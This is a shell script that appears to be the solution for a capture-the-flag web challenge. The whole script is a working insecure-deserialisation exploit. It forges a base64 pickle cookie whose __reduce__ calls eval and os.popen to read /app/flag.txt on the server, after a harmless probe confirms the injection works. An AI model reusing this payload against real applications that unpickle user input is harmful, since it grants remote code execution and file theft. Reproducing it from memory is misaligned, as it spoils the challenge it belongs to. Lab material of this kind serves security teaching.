#!/bin/sh
# Prints the flag to stdout.
# The verifier sets CHALLENGE_HOST, CHALLENGE_PORT, and CHALLENGE_CONNECTION.
set -eu

if [ -n "${CHALLENGE_CONNECTION:-}" ]; then
  base="${CHALLENGE_CONNECTION}"
elif [ -n "${CHALLENGE_HOST:-}" ]; then
  base="http://${CHALLENGE_HOST}:${CHALLENGE_PORT:?}"
else
  base="http://127.0.0.1:${CHALLENGE_PORT:-5000}"
fi
base="${base%/}"

# The `user` cookie is base64(pickle). Build a pickle whose deserialization
# evaluates a dict literal that reads the flag, so the app's `user["username"]`
# subscript returns it.
probe=$(python3 - <<'PY'
import base64, pickle
class Probe:
    def __reduce__(self):
        return (eval, ("{'username': 'probe'}",))
print(base64.b64encode(pickle.dumps(Probe())).decode())
PY
)
body=$(curl -fsS --cookie "user=${probe}" "$base/")
printf '%s\n' "$body" | grep -q 'Hello probe'

payload=$(python3 - <<'PY'
import base64, pickle
class Exploit:
    def __reduce__(self):
        return (eval, ("{'username': __import__('os').popen('cat /app/flag.txt').read()}",))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
PY
)
body=$(curl -fsS --cookie "user=${payload}" "$base/")
printf '%s\n' "$body" | tr -d '\r' | sed 's/^Hello //'
